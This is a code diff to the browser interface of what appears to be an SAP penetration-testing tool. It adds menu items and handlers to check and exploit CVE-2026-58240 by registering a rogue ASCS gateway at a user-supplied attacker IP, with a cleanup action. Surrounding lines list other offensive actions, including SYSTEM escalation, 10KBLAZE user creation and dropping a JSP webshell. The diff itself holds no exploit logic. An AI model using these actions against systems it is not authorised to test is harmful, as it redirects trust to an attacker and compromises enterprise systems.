@@ -1233,6 +1233,7 @@ body {
       <div class="ctx-item" data-action="rfc_system_info">&#128225; RFC System Info</div>
       <div class="ctx-item" data-action="check_gw">&#128270; Check GW Vulnerability</div>
       <div class="ctx-item" data-action="check_ms">&#128270; Check MS Betrusted (CVE-2020-6207)</div>
+      <div class="ctx-item" data-action="check_cve_58240">&#128270; Check CVE-2026-58240 (MS ASCS_GW rogue reg.)</div>
       <div class="ctx-item" data-action="check_cve_31324">&#128270; Check CVE-2025-31324 (Java VisualComposer)</div>
       <div class="ctx-item" data-action="check_cve_6287">&#128270; Check CVE-2020-6287 (RECON)</div>
       <div class="ctx-item" data-action="check_cve_22536">&#128270; Check CVE-2022-22536 (ICMAD smuggle)</div>
@@ -1260,6 +1261,8 @@ body {
       <div class="ctx-item" data-action="exploit_windows_lpe">&#9889; Escalate to SYSTEM (auto: EfsPotato / GodPotato / MiniPlasma)</div>
       <div class="ctx-item" data-action="betrusted">&#128272; Betrusted — Inject Trusted IP (10KBLAZE)</div>
       <div class="ctx-item" data-action="create_user_betrusted">&#128272; Create User (10KBLAZE Full Chain)</div>
+      <div class="ctx-item" data-action="exploit_cve_58240_register">&#9889; Register Rogue ASCS Gateway (CVE-2026-58240)</div>
+      <div class="ctx-item" data-action="exploit_cve_58240_unregister">&#128245; Unregister Rogue ASCS Gateway (cleanup)</div>
       <div class="ctx-item" data-action="create_user_java">&#128100; Create User (Java UME)</div>
       <div class="ctx-item" data-action="exploit_cve_31324_drop">&#128272; Drop JSP Webshell (CVE-2025-31324)</div>
       <div class="ctx-item" data-action="wd_admin_probe_defaults">&#128270; Probe WD admin default credentials</div>
@@ -7881,6 +7884,34 @@ async function ctxAction(action) {
       await api('POST', `node/${sid}/check_ms`); break;
     case 'check_cve_31324':
       await api('POST', `node/${sid}/check_cve_2025_31324`); break;
+    case 'check_cve_58240':
+      await api('POST', `node/${sid}/check_cve_2026_58240`); break;
+    case 'exploit_cve_58240_register': {
+      const nn = (mapState.nodes || {})[sid];
+      if (!nn || !nn.cve_2026_58240_vulnerable) {
+        showToast('Run "Check CVE-2026-58240" first — opcode family status unknown', 'warn');
+        break;
+      }
+      const attacker_ip = prompt(
+        'Attacker IP to advertise as the rogue ASCS gateway '
+        + '(leave 127.0.0.1 for a dead-end host):',
+        '127.0.0.1');
+      if (attacker_ip === null) break;
+      const rogue_port = prompt(
+        'Fake ASCS gateway port:', '31337');
+      if (rogue_port === null) break;
+      if (!confirm(
+        `⚠️ DESTRUCTIVE — this registers a rogue ASCS gateway on ${sid}\n`
+        + `(${nn.ip}:${nn.cve_2026_58240_ms_port}).  Every subscribed AS\n`
+        + `will trust ${attacker_ip}:${rogue_port} as the ASCS gateway.\n`
+        + `Confirm on an authorised target only.`)) break;
+      await api('POST', `node/${sid}/exploit_cve_2026_58240_register`,
+        {confirm: true, attacker_ip, rogue_port: parseInt(rogue_port, 10)});
+      break;
+    }
+    case 'exploit_cve_58240_unregister':
+      await api('POST',
+        `node/${sid}/exploit_cve_2026_58240_unregister`); break;
     case 'check_cve_6287':
       await api('POST', `node/${sid}/check_cve_2020_6287`); break;
     case 'check_cve_22536':
@@ -7898,6 +7929,7 @@ async function ctxAction(action) {
       const jobs = [];
       if (gwPort) jobs.push(api('POST', `node/${sid}/check_gw`));
       if (isA || isJ) jobs.push(api('POST', `node/${sid}/check_ms`));
+      if (isA) jobs.push(api('POST', `node/${sid}/check_cve_2026_58240`));
       if (isJ) jobs.push(api('POST', `node/${sid}/check_cve_2025_31324`));
       if (isJ) jobs.push(api('POST', `node/${sid}/check_cve_2020_6287`));
       if (isA || isJ || nn.is_web_dispatcher) jobs.push(api('POST', `node/${sid}/check_cve_2022_22536`));
